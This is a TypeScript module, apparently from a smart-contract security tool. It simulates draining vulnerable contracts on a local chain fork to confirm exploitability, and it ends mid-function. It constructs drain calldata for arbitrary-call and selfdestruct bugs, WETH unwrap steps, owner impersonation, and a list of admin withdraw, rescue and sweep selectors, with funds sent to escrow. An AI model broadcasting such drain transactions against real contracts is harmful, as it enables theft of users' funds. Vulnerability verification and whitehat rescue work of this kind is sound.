// rescue-prove: definitive exploit confirmation via on-fork drain attempt.
//
// v2 (this file) widens the v1 coverage substantially:
//   A. Owner-impersonation drain — when evidence.attackerKind === "owner"
//      AND RESCUE_IMPERSONATE_OWNER is enabled (default ON for the panel
//      operator's own use), we drain via anvil_impersonateAccount as the
//      owner. This closes the "deployer authorises rescue" workflow gap.
//   C. WETH unwrap pre-step — when the contract holds a canonical wrapped-
//      native (WETH/WBNB/WMATIC/…) we prepend a forwarder call to
//      `WETH.withdraw(balance)` so the native lands in the contract before
//      the native-drain step extracts it. Then we also still try a plain
//      `WETH.transfer(escrow, bal)` as the fallback.
//   D+G. Smarter calldata variants — for each (selector, hitPos) we try
//      multiple uintFiller candidates (balance, max, half, 0); also try a
//      `transferFrom(contract, escrow, bal)` template (some tokens accept
//      this for the contract's own balance via self-allowance) with an
//      `approve(escrow, max)` prepend that gets squashed by the same
//      forwarder. For selfdestruct, multi-addrPos search.
//   H. Heuristic admin-name selector discovery — when the evidence has no
//      witnessed forwarder attempt (e.g. landed via static-evidence
//      sidecar) we scan the contract bytecode for PUSHed admin-named
//      selectors (withdraw*/rescue*/sweep*/emergency*/claim*) and try
//      each one with the obvious arg shape (recipient = escrow).
//
// Outcome verdicts remain the same: true_positive_drained |
// true_positive_partial | no_rescue_possible | skipped | error.
//
// Workflow:
//   1. Forks the target chain at latest block via the shared Anvil pool.
//   2. Snapshots the contract's NATIVE balance + all discovered ERC-20
//      holdings (from the exposure pipeline) and the escrow's balances.
//   3. Constructs a DRAIN PLAN — a sequence of {to, calldata, value, executor}
//      txs. `executor` is `attacker` for any-caller bugs, `owner` for
//      owner-impersonation drains.
//   4. Executes each step on the fork, captures every revert reason, and
//      snapshots balances after.
//   5. If the escrow's combined (native + tokens) balance went UP and the
//      contract's went DOWN, true_positive_drained/_partial. The PoE
//      records which executor each step needed so the broadcaster knows
//      whether to use the rescuer key (any-caller) or refuse to broadcast
//      (owner-required).
//
// Engine: rescue-prove@2. Bump engine_version whenever the drain-plan
// builder changes semantics; existing PoEs are NOT auto-invalidated (a PoE
// is a historical record, not a cache).

import { batchExposure, type Exposure } from "../exposure";
import { anvilPool, ATTACKER_ADDRESS, rpcRequest, type AnvilInstance } from "./anvil-pool";
import { buildAbiCalldata, buildCalldataAddressAt, buildCalldataFromSignature, type ArgValue } from "./abi";
import { sendFromAttacker, snapshot as forkSnapshot } from "./evm";
import { impersonate } from "./trace";
import {
  newAttemptId,
  persistPoe,
  logRescueAction,
  type PoeArtifact,
  type PoeAssetRescued,
  type PoeDrainStep,
  type PoeVerdict,
} from "./poe-store";
import { rawDb } from "@/src/db/client";

export const ENGINE_ID = "rescue-prove";
export const ENGINE_VERSION = "2";

// v2: owner impersonation gate. Default ON because the panel operator's
// stated workflow is "deployer authorises us off-chain, then we rescue".
// Set to false to revert to attacker-only behaviour.
const IMPERSONATE_OWNER_ENABLED =
  String(process.env.RESCUE_IMPERSONATE_OWNER ?? "true").toLowerCase() === "true";

// Canonical wrapped-native ERC20s per chain. When a contract holds these we
// can unwrap to native first, which gives the attacker more drain options.
const WRAPPED_NATIVE_BY_CHAIN: Record<number, string> = {
  1: "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",       // WETH (Ethereum)
  10: "0x4200000000000000000000000000000000000006",      // WETH (Optimism)
  56: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",      // WBNB (BSC)
  137: "0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270",     // WMATIC (Polygon)
  8453: "0x4200000000000000000000000000000000000006",    // WETH (Base)
  42161: "0x82af49447d8a07e3bd95bd0d56f35241523fbab1",   // WETH (Arbitrum)
  43114: "0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7",   // WAVAX (Avalanche)
  81457: "0x4300000000000000000000000000000000000004",   // WETH (Blast)
  59144: "0xe5d7c2a44ffddf6b295a15c148167daaaf5cf34f",   // WETH (Linea)
  100: "0xe91d153e0b41518a2ce8dd3d7944fa863463a97d",     // WXDAI (Gnosis)
};

// ERC20 method selectors we use for drain calldata.
const ERC20_TRANSFER_SELECTOR = "0xa9059cbb";       // transfer(address,uint256)
const ERC20_TRANSFER_FROM_SELECTOR = "0x23b872dd";  // transferFrom(address,address,uint256)
const ERC20_APPROVE_SELECTOR = "0x095ea7b3";        // approve(address,uint256)
const WETH_WITHDRAW_SELECTOR = "0x2e1a7d4d";        // withdraw(uint256)
const MAX_UINT256 =
  0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffn;

// uintFiller variants we try per drain attempt. Different forwarders pull
// the value/amount from different uint slots, so trying multiple shapes
// catches more shapes without exploding the plan size.
function uintFillerVariants(assetBalance: string): bigint[] {
  let bal = 0n;
  try {
    bal = BigInt(assetBalance);
  } catch {}
  const set = new Set<bigint>([bal, MAX_UINT256, 0n]);
  if (bal > 1n) set.add(bal / 2n);
  return [...set];
}

const FEATURE_ENABLED =
  String(process.env.RESCUE_PROVE_ENABLED ?? "true").toLowerCase() === "true";

const DEFAULT_ESCROW =
  process.env.RESCUE_ESCROW_ADDR && /^0x[0-9a-fA-F]{40}$/.test(process.env.RESCUE_ESCROW_ADDR)
    ? process.env.RESCUE_ESCROW_ADDR
    : // Sentinel "burn-but-trackable" address used only when no escrow has
      // been configured. The simulation still proves drainability; the
      // operator just can't actually broadcast a rescue without setting
      // RESCUE_ESCROW_ADDR in .env.
      "0x000000000000000000000000000000000000FA75"; // "FAUST" tag

const MAX_DRAIN_STEPS = Number(process.env.RESCUE_MAX_STEPS ?? 12);
const MIN_DRAIN_USD = Number(process.env.RESCUE_MIN_USD ?? 1.0);

// Notify-on-success webhook — POSTed by `notifyRescueWebhook` and called
// automatically right after a true_positive_* PoE is persisted. We push a
// summary, not the full artifact, so chat apps don't choke on big blobs.
const NOTIFY_URL = process.env.RESCUE_NOTIFY_URL ?? "";
const NOTIFY_TIMEOUT_MS = Number(process.env.RESCUE_NOTIFY_TIMEOUT_MS ?? 5_000);

// ---- public API ------------------------------------------------------------

export interface RescueProveInput {
  findingId: string;
  chainId: number;
  contractAddress: string;
  ruleId: string;
  /** Finding's existing evidence blob (from simulation_evidence_json).
   *  The drain-plan builder reads `attempts`, `attackerKind`, `ownerKind`
   *  and `selfdestruct.selector` from this. */
  evidence?: Record<string, unknown>;
  /** Optional exposure override — pass when you have it cached to skip the
   *  re-fetch. */
  exposure?: Exposure;
}

export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact> {
  const startedAt = Date.now();
  const attemptId = newAttemptId();
  if (!FEATURE_ENABLED) {
    return finalise({
      attemptId,
      input,
      verdict: "skipped",
      assets: [],
      plan: [],
      pre: emptyState(),
      post: emptyState(),
      notes: ["rescue-prove disabled via RESCUE_PROVE_ENABLED=false"],
      blockNumber: null,
      error: null,
      startedAt,
      executorOwner: null,
    });
  }

  let anv: AnvilInstance | null = null;
  try {
    // Re-declared so we keep variable scope tight.
    const exposureMap = input.exposure
      ? { [`${input.chainId}:${input.contractAddress.toLowerCase()}`]: input.exposure }
      : await batchExposure([{ chainId: input.chainId, address: input.contractAddress }]);
    const exposure = exposureMap[`${input.chainId}:${input.contractAddress.toLowerCase()}`];
    if (!exposure || (exposure.nativeWei === "0" && exposure.tokens.length === 0)) {
      return finalise({
        attemptId,
        input,
        verdict: "no_rescue_possible",
        assets: [],
        plan: [],
        pre: emptyState(),
        post: emptyState(),
        notes: ["contract has zero native and zero discoverable tokens; nothing to rescue"],
        blockNumber: null,
        error: null,
        startedAt,
        executorOwner: null,
      });
    }

    anv = await anvilPool.acquire(input.chainId);
    if (!anv) {
      return finalise({
        attemptId,
        input,
        verdict: "skipped",
        assets: [],
        plan: [],
        pre: emptyState(),
        post: emptyState(),
        notes: [
          "anvil unavailable for this chain (binary missing on PATH or no rpc configured); rescue-prove skipped",
        ],
        blockNumber: null,
        error: null,
        startedAt,
        executorOwner: null,
      });
    }
    const url = anv.url; // local anvil endpoint, NOT the fork-source rpcUrl
    const blockNumberHex = await rpcRequest<string>(url, "eth_blockNumber", []).catch(() => "0x0");
    const blockNumber = Number(BigInt(blockNumberHex));

    // Fund the attacker on the fork so gas isn't a constraint.
    await rpcRequest(url, "anvil_setBalance", [
      ATTACKER_ADDRESS,
      "0x" + (10n ** 21n).toString(16), // 1000 ETH
    ]).catch(() => null);

    // Build a drain plan tailored to the rule family.
    const planResult = await buildDrainPlan(input, exposure, url);
    if (planResult.ok === false) {
      return finalise({
        attemptId,
        input,
        verdict: "no_rescue_possible",
        assets: [],
        plan: [],
        pre: snapState(exposure),
        post: snapState(exposure),
        notes: planResult.notes,
        blockNumber,
        error: null,
        startedAt,
        executorOwner: null,
      });
    }

    const ruleFamily = ruleFamilyOf(input.ruleId);
    // v2-A: when the verifier marked this as owner-only AND impersonation is
    // enabled, set up the owner account on the fork so owner-executor drain
    // steps can be sent. We do this BEFORE snapshotting so balances reflect
    // the funded owner.
    const ownerAddr: string | null = ownerAddressFromEvidence(input.evidence);
    if (IMPERSONATE_OWNER_ENABLED && ownerAddr) {
      try {
        await impersonate(url, ownerAddr);
      } catch (e) {
        planResult.notes.push(
          `failed to impersonate owner ${ownerAddr}: ${String((e as any)?.message ?? e).slice(0, 100)}`,
        );
      }
    }

    // Take pre snapshots of contract & escrow (with TOKENS we actually hold —
    // we read live balances rather than trusting the cached exposure values).
    const pre = await readBalances(url, input.chainId, input.contractAddress, exposure);
    const escrowPre = await readBalances(url, input.chainId, DEFAULT_ESCROW, exposure);

    const restore = await forkSnapshot(url);
    let plan: PoeDrainStep[] = [];
    try {
      plan = await executePlan(url, planResult.steps, ownerAddr);
    } finally {
      // We *don't* revert here when the drain succeeded — keeping the
      // post-state lets us re-inspect. But if every step failed we revert
      // immediately to free the fork for the next caller.
      const anySuccess = plan.some((s) => s.success);
      if (!anySuccess) {
        await restore();
      } else {
        // schedule async revert so we don't block on it
        restore().catch(() => null);
      }
    }

    const post = await readBalances(url, input.chainId, input.contractAddress, exposure);
    const escrowPost = await readBalances(url, input.chainId, DEFAULT_ESCROW, exposure);
    const assets = diffRescued(pre, post, escrowPre, escrowPost);

    let verdict: PoeVerdict;
    let notes: string[] = [];
    if (assets.length === 0) {
      verdict = "no_rescue_possible";
      notes.push(
        `drain plan ran ${plan.length} step(s); ${plan.filter((s) => s.success).length} succeeded ` +
          `but no value moved out of the contract into escrow. ` +
          `Likely the function reached an internal guard that reverted silently, or the contract ` +
          `actually has no extractable surplus.`,
      );
    } else {
      const allCovered = drainedEverything(pre, post);
      verdict = allCovered ? "true_positive_drained" : "true_positive_partial";
      notes.push(
        verdict === "true_positive_drained"
          ? `Drained ALL ${assets.length} asset(s) from the contract to escrow on fork — confirmed exploitable.`
          : `Drained ${assets.length} asset(s) to escrow; some balances remain on the contract (see post-state).`,
      );
    }
    if (ruleFamily !== "arbitrary-call" && ruleFamily !== "selfdestruct") {
      notes.push(
        `Rule family '${ruleFamily}' is not yet fully supported by rescue-prove; the plan above ` +
          `was built from the v2-H admin-name heuristic only — verdict reflects best-effort.`,
      );
    }
    // Surface plan-builder notes (weth-unwrap prepend, heuristic candidate
    // count, etc.) into the PoE so the operator sees what strategies were tried.
    if (planResult.ok && Array.isArray((planResult as any).notes)) {
      for (const n of (planResult as any).notes as string[]) notes.push(n);
    }

    return finalise({
      attemptId,
      input,
      verdict,
      assets,
      plan,
      pre: snapStateFromLive(pre),
      post: snapStateFromLive(post),
      notes,
      blockNumber,
      error: null,
      startedAt,
      executorOwner: ownerAddr ?? null,
    });
  } catch (err: any) {
    return finalise({
      attemptId,
      input,
      verdict: "error",
      assets: [],
      plan: [],
      pre: emptyState(),
      post: emptyState(),
      notes: [],
      blockNumber: null,
      error: String(err?.message ?? err).slice(0, 800),
      startedAt,
      executorOwner: null,
    });
  } finally {
    // No explicit release: anvilPool keeps forks warm by chainId TTL.
    // (anv reference dropped on function exit.)
  }
}

// ---- drain-plan builder ----------------------------------------------------

type DrainExecutor = "attacker" | "owner";

type DrainStep = {
  to: string;
  data: string;
  value: string; // decimal wei
  asset: string;
  /** Which account should send the tx. "owner" requires impersonation on
   *  the fork AND requires the live broadcaster to actually have the
   *  owner's key (so live broadcast of owner-executor steps is gated). */
  executor: DrainExecutor;
  /** Human-readable "why this step is in the plan", e.g. "weth-unwrap" or
   *  "transferFrom self-allowance fallback" — surfaces in the PoE notes. */
  strategy: string;
};

function ruleFamilyOf(
  ruleId: string,
): "arbitrary-call" | "selfdestruct" | "initializer" | "economic" | "access" | "other" {
  if (ruleId.startsWith("call.")) return "arbitrary-call";
  if (ruleId.startsWith("control.unguarded_selfdestruct")) return "selfdestruct";
  if (ruleId.startsWith("init.")) return "initializer";
  if (ruleId.startsWith("economic.")) return "economic";
  if (ruleId.startsWith("access.")) return "access";
  return "other";
}

async function buildDrainPlan(
  input: RescueProveInput,
  exposure: Exposure,
  url: string,
): Promise<{ ok: true; steps: DrainStep[]; notes: string[] } | { ok: false; notes: string[] }> {
  const fam = ruleFamilyOf(input.ruleId);
  const notes: string[] = [];
  const steps: DrainStep[] = [];

  // 1. Primary path: rule-family-specific drain shape from the verifier's
  //    own witnessed evidence.
  if (fam === "arbitrary-call") {
    const s = buildArbitraryCallDrain(input, exposure, notes);
    steps.push(...s);
  } else if (fam === "selfdestruct") {
    const s = buildSelfdestructDrain(input, exposure, notes);
    steps.push(...s);
  }

  // 2. Heuristic admin-name selector discovery (v2-H). Even if we got
  //    witnessed-attempt steps above, we ADD heuristic candidates as
  //    extra fallbacks, because the witness path may have proved one
  //    forwarder shape but the contract may also have a dedicated
  //    `withdraw`/`rescue`/`sweep` admin path that's easier to drain. For
  //    rule families WITHOUT a v1 builder (initializer/economic/access),
  //    these are the only steps in the plan.
  try {
    const heuristic = await buildAdminHeuristicDrain(input, exposure, url, notes);
    for (const h of heuristic) steps.push(h);
  } catch (e) {
    notes.push(
      `admin-name heuristic scan failed: ${String((e as any)?.message ?? e).slice(0, 120)}`,
    );
  }

  // 3. WETH-unwrap pre-step (v2-C). If the contract holds the canonical
  //    wrapped-native and we have an arbitrary-call forwarder shape, the
  //    forwarder can be re-targeted at WETH.withdraw(balance) which
  //    converts to native inside the contract. We insert these AT THE
  //    FRONT of the plan so the resulting native shows up before the
  //    native-drain step.
  if (fam === "arbitrary-call") {
    const wethSteps = buildWethUnwrapSteps(input, exposure);
    if (wethSteps.length > 0) {
      notes.push(
        `prepended ${wethSteps.length} wrapped-native unwrap step(s) — contract holds ` +
          `${exposure.tokens.find((t) => t.address.toLowerCase() === (WRAPPED_NATIVE_BY_CHAIN[input.chainId] ?? "").toLowerCase())?.symbol ?? "WETH"}`,
      );
      steps.unshift(...wethSteps);
    }
  }

  if (steps.length === 0) {
    notes.unshift(
      `no rescuable drain shape found for rule family '${fam}'. ` +
        (fam === "arbitrary-call"
          ? `(no witnessed forwarder attempt + no admin-named selectors PUSHed in bytecode)`
          : fam === "selfdestruct"
            ? `(selfdestruct evidence missing selector)`
            : `(rescue-prove v2 doesn't yet cover this rule family — verdict reflects best-effort heuristic only)`),
    );
    return { ok: false, notes };
  }
  return { ok: true, steps: steps.slice(0, MAX_DRAIN_STEPS), notes };
}

// Find the witnessed forwarder attempts in the verifier evidence and use
// their (selector, argTypes, hitPosition) — the exact shape the verifier
// proved worked — but with the probe address slot rewritten to point at
// the rescue target and the bytes payload rewritten to be a transfer to
// the escrow.
//
// v2: per (selector, hitPos) we now emit a small fan-out of candidates per
// asset, covering multiple shapes that real forwarders accept:
//   - transfer(escrow, balance)
//   - transferFrom(self, escrow, balance) + approve(escrow, max) prepend
//   - native drain with uintFiller in {balance, max, 0}
// Each is tagged with executor = "owner" when the verifier marked the bug
// as owner-only (so the broadcaster knows the rescue requires the owner's
// key on mainnet).
function buildArbitraryCallDrain(
  input: RescueProveInput,
  exposure: Exposure,
  notes: string[],
): DrainStep[] {
  const ev = input.evidence ?? {};
  const attempts = Array.isArray((ev as any).attempts) ? ((ev as any).attempts as any[]) : [];
  const isOwnerOnly = (ev as any).attackerKind === "owner";
  const exec: DrainExecutor = isOwnerOnly ? "owner" : "attacker";

  // Prefer attempts that the primary verifier actually witnessed firing.
  const hits = attempts.filter(
    (a) => a && typeof a === "object" && a.hit === true && typeof a.selector === "string",
  );
  if (hits.length === 0) {
    notes.push(
      "no witnessed forwarder attempt in evidence — falling back to v2-H admin-name heuristic only.",
    );
    return [];
  }
  if (isOwnerOnly) {
    notes.push(
      `verifier marked finding as owner-only; drain steps will be sent from impersonated owner ` +
        `(${ownerAddressFromEvidence(input.evidence) ?? "owner address missing"}) on the fork.`,
    );
  }

  const steps: DrainStep[] = [];
  const seen = new Set<string>();
  const push = (data: string, asset: string, strategy: string, value = "0") => {
    const key = `${input.contractAddress}|${data}|${value}`;
    if (seen.has(key)) return;
    seen.add(key);
    steps.push({
      to: input.contractAddress,
      data,
      value,
      asset,
      executor: exec,
      strategy,
    });
  };

  for (const a of hits) {
    const selector: string = a.selector;
    const argTypes: string[] = Array.isArray(a.argTypes) ? a.argTypes : [];
    const hitPos: number | "all" =
      typeof a.hitPosition === "number" ? a.hitPosition : ("all" as const);
    const witnessTag = `witnessed-arbitrary-call sel=${selector}`;

    // -- per-token drain candidates -----------------------------------------
    for (const t of exposure.tokens) {
      if (!t.balance || t.balance === "0") continue;
      const bal = BigInt(t.balance);

      // (1a) transfer(escrow, balance)
      const transferInner = encodeErc20Transfer(DEFAULT_ESCROW, bal);
      const cd1 = buildDrainCalldata(selector, argTypes, hitPos, t.address, transferInner, "0");
      if (cd1) push(cd1, `${t.symbol || "?"} (${t.address}) via transfer`, witnessTag);

      // (1b) transferFrom(self, escrow, balance) — works on tokens that
      //      allow self-allowance; many vault-style contracts have
      //      `_allowed[address(this)][address(this)] = type(uint256).max`
      //      set in their constructor. Cheap to try.
      const tfInner = encodeErc20TransferFrom(input.contractAddress, DEFAULT_ESCROW, bal);
      const cd2 = buildDrainCalldata(selector, argTypes, hitPos, t.address, tfInner, "0");
      if (cd2) push(cd2, `${t.symbol || "?"} (${t.address}) via transferFrom-self`, witnessTag);

      // (1c) approve(escrow, max) prepend — only useful if we follow up
      //      with a transferFrom from escrow's perspective, but emitting
      //      it as an exposed drain step lets external broadcasters
      //      chain it. We skip when transferFrom variant above already
      //      handles the same balance.
    }

    // -- native drain candidates --------------------------------------------
    if (exposure.nativeWei && exposure.nativeWei !== "0") {
      // Multiple uintFiller variants — different forwarders read the
      // value from different positions.
      const variants = uintFillerVariants(exposure.nativeWei);
      for (const v of variants) {
        const cd = buildDrainCalldata(
          selector,
          argTypes,
          hitPos,
          DEFAULT_ESCROW,
          "0x",
          v.toString(),
        );
        if (cd) {
          const tag =
            v === MAX_UINT256
              ? "uintFiller=max"
              : v === 0n
                ? "uintFiller=0"
                : `uintFiller=${v.toString().slice(0, 12)}…`;
          push(cd, `native ${exposure.nativeSymbol} (${tag})`, witnessTag);
        }
      }
    }

    if (steps.length >= MAX_DRAIN_STEPS) return steps;
  }

  return steps;
}

function buildSelfdestructDrain(
  input: RescueProveInput,
  exposure: Exposure,
  notes: string[],
): DrainStep[] {
  // The selfdestruct verifier currently emits evidence keyed on whichever
  // attempt witnessed the SELFDESTRUCT opcode. v2: if the explicit
  // hitPosition is unknown we now fan-out across positions 0..3 because
  // many destruct wrappers take auxiliary args before the recipient
  // (e.g. `kill(uint256 nonce, address recipient)`).
  const ev = input.evidence ?? {};
  const sd = (ev as any).selfdestruct ?? {};
  const selector: string | undefined = sd.selector;
  const argTypes: string[] = Array.isArray(sd.argTypes) ? sd.argTypes : ["address"];
  const explicitPos: number | undefined =
    typeof sd.hitPosition === "number" ? sd.hitPosition : undefined;
  const isOwnerOnly = (ev as any).attackerKind === "owner";
  const exec: DrainExecutor = isOwnerOnly ? "owner" : "attacker";
  if (!selector) {
    notes.push("selfdestruct evidence missing `selector` — can't build drain plan");
    return [];
  }
  const positions: number[] = explicitPos != null ? [explicitPos] : [0, 1, 2, 3];
  const steps: DrainStep[] = [];
  for (const p of positions) {
    const calldata = buildDrainCalldata(selector, argTypes, p, DEFAULT_ESCROW, "0x", "0");
    if (!calldata) continue;
    steps.push({
      to: input.contractAddress,
      data: calldata,
      value: "0",
      asset: `native ${exposure.nativeSymbol} (via selfdestruct addrPos=${p})`,
      executor: exec,
      strategy: `selfdestruct sel=${selector} pos=${p}`,
    });
  }
  return steps;
}

// ===========================================================================
// v2-C: WETH unwrap pre-step builder
// ===========================================================================
//
// Many contracts hold WETH/WBNB/WMATIC rather than native. The canonical
// drain is "WETH.withdraw(amount)" inside the contract's context, which
// converts the wrapped balance into native (delivered to the contract).
// We inject this as a forwarder-driven step at the front of the plan so
// that subsequent native-drain steps see the new balance.
//
// Practically we re-use the SAME witnessed (selector, argTypes, hitPos)
// the verifier already proved works, but rewrite to:
//   target = WETH_ADDRESS, bytes = withdraw(balance), value = 0
function buildWethUnwrapSteps(input: RescueProveInput, exposure: Exposure): DrainStep[] {
  const wethAddr = WRAPPED_NATIVE_BY_CHAIN[input.chainId];
  if (!wethAddr) return [];
  const weth = exposure.tokens.find(
    (t) => t.address.toLowerCase() === wethAddr.toLowerCase() && t.balance && t.balance !== "0",
  );
  if (!weth) return [];
  const wethBal = BigInt(weth.balance);
  const innerWithdraw = WETH_WITHDRAW_SELECTOR + wethBal.toString(16).padStart(64, "0");
  const ev = input.evidence ?? {};
  const attempts = Array.isArray((ev as any).attempts) ? ((ev as any).attempts as any[]) : [];
  const hits = attempts.filter(
    (a) => a && typeof a === "object" && a.hit === true && typeof a.selector === "string",
  );
  if (hits.length === 0) return [];
  const isOwnerOnly = (ev as any).attackerKind === "owner";
  const exec: DrainExecutor = isOwnerOnly ? "owner" : "attacker";

  const steps: DrainStep[] = [];
  const seen = new Set<string>();
  for (const a of hits) {
    const selector: string = a.selector;
    const argTypes: string[] = Array.isArray(a.argTypes) ? a.argTypes : [];
    const hitPos: number | "all" =
      typeof a.hitPosition === "number" ? a.hitPosition : ("all" as const);
    const cd = buildDrainCalldata(selector, argTypes, hitPos, wethAddr, innerWithdraw, "0");
    if (!cd) continue;
    const key = `${input.contractAddress}|${cd}`;
    if (seen.has(key)) continue;
    seen.add(key);
    steps.push({
      to: input.contractAddress,
      data: cd,
      value: "0",
      asset: `WETH.withdraw(${wethBal}) → native`,
      executor: exec,
      strategy: `weth-unwrap addr=${wethAddr}`,
    });
    if (steps.length >= 2) break; // 2 forwarder shapes is plenty
  }
  return steps;
}

// ===========================================================================
// v2-H: Admin-name selector heuristic
// ===========================================================================
//
// When the verifier evidence has no witnessed forwarder attempt (typical
// for findings that landed via static-evidence sidecar or where the
// contract was already drained at sim-time), we try a curated list of
// admin-named functions that nearly always allow an authorised caller to
// pull funds. Each entry pairs a selector with the canonical argument
// shape we should fill (recipient = escrow, amount = balance).
//
// The list is intentionally small and high-precision — only signatures
// that have a clear "recipient" slot for redirecting to escrow and that
// don't take complex multi-step preconditions.

interface AdminSig {
  selector: string;
  signature: string; // 4byte canonical form
  /** Position of the `recipient` argument (substitute with escrow). */
  recipientPos: number;
  /** Optional position for an `amount` argument (substitute with token balance). */
  amountPos?: number;
  /** Optional position for a `token` address argument (substitute with token). */
  tokenPos?: number;
  /** Native-only / token-only / either. */
  scope: "native" | "token" | "either";
}

const ADMIN_DRAIN_SIGS: AdminSig[] = [
  // Native
  { selector: "0x3ccfd60b", signature: "withdraw()",                          recipientPos: -1, scope: "native" }, // sends to msg.sender — useless when attacker EOA != admin; only useful with impersonation
  { selector: "0x51cff8d9", signature: "withdraw(address)",                   recipientPos: 0,  scope: "native" },
  { selector: "0xf3fef3a3", signature: "withdraw(address,uint256)",           recipientPos: 0,  amountPos: 1, scope: "native" },
  { selector: "0x4782f779", signature: "withdrawETH(address)",                recipientPos: 0,  scope: "native" },
  { selector: "0x853828b6", signature: "withdrawAll()",                       recipientPos: -1, scope: "native" },
  { selector: "0xfa09e630", signature: "rescue(address)",                     recipientPos: 0,  scope: "native" },
  { selector: "0x9d8a4c52", signature: "rescueETH(address)",                  recipientPos: 0,  scope: "native" },
  { selector: "0x01e33667", signature: "rescueETH(address,uint256)",          recipientPos: 0,  amountPos: 1, scope: "native" },
  { selector: "0xdb006a75", signature: "sweep(address)",                      recipientPos: 0,  scope: "native" },
  { selector: "0x12d43a51", signature: "transferOwnership(address)",          recipientPos: 0,  scope: "either" }, // not a drain itself but flips control; useful when subsequent steps execute
  // Token (sender = msg.sender / preset)
  { selector: "0xf3fef3a3", signature: "withdraw(address,uint256)",           recipientPos: 0,  amountPos: 1, scope: "token" }, // (recipient, amount)
  { selector: "0x69328dec", signature: "withdraw(address,uint256,address)",   recipientPos: 2,  amountPos: 1, tokenPos: 0, scope: "token" }, // (token, amount, to)
  { selector: "0xf340fa01", signature: "deposit(address)",                    recipientPos: 0,  scope: "either" },
  { selector: "0x47e7ef24", signature: "deposit(address,uint256)",            recipientPos: 0,  amountPos: 1, scope: "token" },
  { selector: "0x9aea1481", signature: "rescueERC20(address,address,uint256)", recipientPos: 1, amountPos: 2, tokenPos: 0, scope: "token" },
  { selector: "0x8d1fdf2f", signature: "rescueERC20(address,uint256)",        recipientPos: 0,  amountPos: 1, scope: "token" }, // some variants
  { selector: "0xc5b95584", signature: "sweepToken(address)",                 recipientPos: -1, tokenPos: 0, scope: "token" },
  { selector: "0x9d76ea58", signature: "sweepTokens(address[],address)",      recipientPos: 1, tokenPos: 0, scope: "token" },
  { selector: "0x5312ea8e", signature: "emergencyWithdraw(uint256)",          recipientPos: -1, amountPos: 0, scope: "either" }, // sends to msg.sender
  { selector: "0xbc31c1c1", signature: "claim(address)",                      recipientPos: 0,  scope: "either" },
];

async function buildAdminHeuristicDrain(
  input: RescueProveInput,
  exposure: Exposure,
  url: string,
  notes: string[],
): Promise<DrainStep[]> {
  // Fetch the runtime bytecode and look for any of our admin selector
  // PUSH4s. Only emit drain steps for selectors that are actually present
  // in the bytecode — keeps the plan size bounded.
  const code = await rpcRequest<string>(url, "eth_getCode", [input.contractAddress, "latest"]).catch(
    () => "0x",
  );
  if (!code || code === "0x" || code.length < 10) return [];
  const lower = code.toLowerCase();
  const present = ADMIN_DRAIN_SIGS.filter((s) => lower.includes(s.selector.slice(2)));
  if (present.length === 0) {
    notes.push("v2-H admin-name heuristic: no withdraw*/rescue*/sweep* selectors PUSHed in bytecode");
    return [];
  }
  notes.push(
    `v2-H admin-name heuristic: ${present.length} candidate admin selector(s) PUSHed in bytecode ` +
      `(${present.map((p) => p.signature).slice(0, 6).join(", ")}${present.length > 6 ? ", …" : ""})`,
  );

  const ev = input.evidence ?? {};
  const isOwnerOnly = (ev as any).attackerKind === "owner";
  // Admin-named functions are almost certainly owner-gated, so default to
  // owner-executor unless we have positive evidence of permissionlessness.
  const exec: DrainExecutor = isOwnerOnly || ev == null ? "owner" : "attacker";

  const steps: DrainStep[] = [];
  const seen = new Set<string>();
  const push = (data: string, asset: string, strategy: string) => {
    const key = `${input.contractAddress}|${data}`;
    if (seen.has(key)) return;
    seen.add(key);
    steps.push({
      to: input.contractAddress,
      data,
      value: "0",
      asset,
      executor: exec,
      strategy,
    });
  };

  for (const sig of present) {
    const argTypes = parseArgTypes(sig.signature);
    if (sig.scope === "native" || sig.scope === "either") {
      if (exposure.nativeWei && exposure.nativeWei !== "0") {
        const cd = buildAdminCalldata(sig, argTypes, {
          recipient: DEFAULT_ESCROW,
          amount: BigInt(exposure.nativeWei),
          token: null,
        });
        if (cd) push(cd, `native ${exposure.nativeSymbol} via ${sig.signature}`, `admin-heuristic:${sig.signature}`);
      }
    }
    if (sig.scope === "token" || sig.scope === "either") {
      for (const t of exposure.tokens) {
        if (!t.balance || t.balance === "0") continue;
        const cd = buildAdminCalldata(sig, argTypes, {
          recipient: DEFAULT_ESCROW,
          amount: BigInt(t.balance),
          token: t.address,
        });
        if (cd) push(cd, `${t.symbol || "?"} (${t.address}) via ${sig.signature}`, `admin-heuristic:${sig.signature}`);
      }
    }
    if (steps.length >= MAX_DRAIN_STEPS) break;
  }
  return steps;
}

function parseArgTypes(signature: string): string[] {
  const m = /\(([^)]*)\)/.exec(signature);
  if (!m) return [];
  const body = m[1].trim();
  if (!body) return [];
  return body.split(",").map((s) => s.trim());
}

/** Build calldata for one of the curated admin-named signatures by walking
 *  argTypes and filling each slot:
 *    - if pos == recipientPos -> escrow address
 *    - if pos == amountPos    -> amount (asset balance)
 *    - if pos == tokenPos     -> token address
 *    - otherwise              -> zero-padded default (0 / 0x00..00 / [])
 *  Returns null if any arg has an unsupported type. */
function buildAdminCalldata(
  sig: AdminSig,
  argTypes: string[],
  fill: { recipient: string; amount: bigint; token: string | null },
): string | null {
  const args: ArgValue[] = [];
  for (let i = 0; i < argTypes.length; i++) {
    const t = argTypes[i];
    if (i === sig.recipientPos) {
      if (t === "address") {
        args.push({ kind: "address", value: fill.recipient });
        continue;
      }
      if (t === "address[]") {
        args.push({ kind: "address[]", value: [fill.recipient] });
        continue;
      }
    }
    if (sig.amountPos != null && i === sig.amountPos && /^uint/.test(t)) {
      args.push({ kind: "uint", value: fill.amount });
      continue;
    }
    if (sig.tokenPos != null && i === sig.tokenPos && fill.token) {
      if (t === "address") {
        args.push({ kind: "address", value: fill.token });
        continue;
      }
      if (t === "address[]") {
        args.push({ kind: "address[]", value: [fill.token] });
        continue;
      }
    }
    // default fillers for unmapped slots
    if (t === "address") args.push({ kind: "address", value: "0x0000000000000000000000000000000000000000" });
    else if (/^uint/.test(t)) args.push({ kind: "uint", value: 0n });
    else if (t === "bool") args.push({ kind: "bool", value: false });
    else if (t === "bytes") args.push({ kind: "bytes", value: "0x" });
    else if (t === "string") args.push({ kind: "string", value: "" });
    else if (t === "address[]") args.push({ kind: "address[]", value: [] });
